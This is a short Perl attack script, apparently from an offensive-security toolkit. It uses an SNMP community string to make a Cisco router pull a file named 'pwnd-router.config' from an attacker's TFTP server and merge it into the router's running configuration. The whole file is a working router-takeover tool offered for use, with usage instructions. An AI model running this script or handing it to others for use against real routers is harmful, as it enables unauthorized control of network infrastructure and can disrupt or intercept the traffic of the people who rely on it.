#!/usr/bin/perl

if ($#ARGV != 2) {
 print "\n######################################################\n";
 print "# Merge Cisco Router config  - Using SNMP\n";
 print "# Hacked up by muts - muts\@offensive-security.com\n";
 print "#######################################################\n";

 print "\nUsage : ./merge-copy-config.pl <router-ip> <tftp-serverip> <community> \n";
 print "\nMake sure a TFTP server is set up, prefferably running from /tmp ! \n\n";
 exit;
}

use Cisco::CopyConfig;

    $|          = 1; # autoflush output
    $tftp       = $ARGV[1];
    $merge_f    = 'pwnd-router.config';
    $host       = $ARGV[0];;
    $comm       = $ARGV[2];;
    $config     = Cisco::CopyConfig->new(
                     Host => $host,
                     Comm => $comm
    );
    $path       = "/tmp/${merge_f}"; 

    print "${tftp}:${merge_f} -> ${host}:running-config... ";
    if ($config->merge($tftp, $merge_f)) {  # merge the new config
      print "OK\n";
    } 
    else {
      die $config->error();
    }
